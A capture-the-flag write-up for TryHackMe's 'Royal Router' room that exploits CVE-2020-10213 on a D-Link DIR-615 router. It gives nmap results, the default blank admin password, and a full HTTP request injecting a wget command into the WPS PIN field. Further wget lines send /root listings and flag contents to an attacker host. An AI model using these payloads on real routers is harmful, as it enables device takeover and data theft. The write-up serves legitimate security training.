# 🛜 Royal Router

* Solving [Royal Router](https://tryhackme.com/room/hfb1royalrouter)

## Finding Initial Vulnerability

1. Finding open Ports: `nmap -p- -sV $TARGET`
```
Nmap scan report for $TARGET
Host is up (0.00016s latency).
Not shown: 65527 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
23/tcp    open  telnet?
80/tcp    open  http    DD-WRT milli_httpd
9999/tcp  open  abyss?
20443/tcp open  unknown
24433/tcp open  unknown
28080/tcp open  unknown
50628/tcp open  unknown
MAC Address: 02:77:0D:27:B5:F1 (Unknown)
Service Info: OS: Linux; Device: WAP; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.05 seconds
```

2. Checking web Port(**80**) on Browser: `http://$TARGET`

3. You'll need the default Password for the Challenge: `https://www.lifewire.com/d-link-dir-615-default-password-2619092`
```
Username: admin
Password: (Blank)
```

4. Searching for Vulnerabilities: `dir-615 hack`

5. **CVE-2020-10213**: [Write-Up](https://tomorrowisnew.com/posts/hacking-the-dlink-dir-615-for-fun-and-no-profit-part-3-cve-2020-10213/)

## Exploitiong Device

1. Start Python Http Server on your system
```sh
python3 -m http.server
```

2. Go to: `http://$TARGET/do_wps.asp`

3. Enable on `PIN` and fill the box with `12345670` and Click `Connect`

4. Capture the Request above in **Burp Suite**

5. Add Your Payload to `wps_sta_enrollee_pin` parameter and send the payload.
```
POST /set_sta_enrollee_pin.cgi HTTP/1.1
Host: $TARGET
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 167
Origin: http://$TARGET
Connection: keep-alive
Referer: http://$TARGET/do_wps.asp
Upgrade-Insecure-Requests: 1
Priority: u=0, i

html_response_page=do_wps_save.asp&html_response_return_page=do_wps.asp&reboot_type=none&wps_pin_radio=0&wps_sta_enrollee_pin=12345670`wget+http://$ATTACKBOX:8000/`
```
- **Make Sure to replace your IP with `$ATTACKBOX`**

6. You should see some Requests in **Python HTTP Server**

# Getting Flag

1. Finding Flag: `wget http://$ATTACKBOX:8000/$(ls /root/)`

2. Read Flag: `wget http://$ATTACKBOX:8000/$(cat /root/flag.txt)`
```
THM{EXFILTRATING_A_MIPS_ROUTER}
```

# References

- 
- [Cheat Sheet - 0xb0b](https://0xb0b.gitbook.io/writeups/tryhackme/2025/hackfinity-battle-vault#royal-router)
- [noobexploiter](https://noob3xploiter.medium.com/hacking-the-dlink-dir-615-for-fun-and-no-profit-a2f1689f9920)
- [Tomorrow is New](https://tomorrowisnew.com)